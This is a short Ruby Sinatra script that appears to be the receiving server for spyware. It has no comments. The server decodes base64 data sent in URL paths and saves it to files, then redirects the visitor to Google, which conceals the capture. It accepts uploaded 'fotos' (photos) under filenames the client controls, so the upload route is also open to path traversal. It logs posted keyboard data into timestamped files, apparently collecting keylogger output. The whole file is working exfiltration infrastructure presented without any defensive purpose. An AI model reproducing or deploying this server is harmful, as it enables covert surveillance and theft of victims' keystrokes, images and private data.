#!/usr/bin/ruby
require 'sinatra'
require 'haml'
require 'base64'

set :bind, '192.168.33.1'

out_path = 'out_files'

get '/:res', :provides => 'html' do | resname | 
    out_file = (0...8).map { (65 + rand(26)).chr }.join 
    File.open("#{out_path}/#{out_file}", 'w') do | f_name | 
        f_name.write(Base64.decode64(resname))
        f_name.write ""
        f_name.close
    end
    puts "Writing to #{out_file} received data #{resname}"
    redirect "http://www.google.com"
end

post '/upload' do
    out_file = Base64.urlsafe_decode64(params['nombre'])
    File.open("fotos/#{out_file}", 'w') do | f_name |
	f_name.write(Base64.urlsafe_decode64(params['valor']))
        f_name.close
	puts out_file
    end
end

post '/key' do
    File.open("keyboard/#{Time.now.to_i}.txt", 'w') do | f_name |
        f_name.write(params["data"])
        f_name.close
    end
    "Done"
end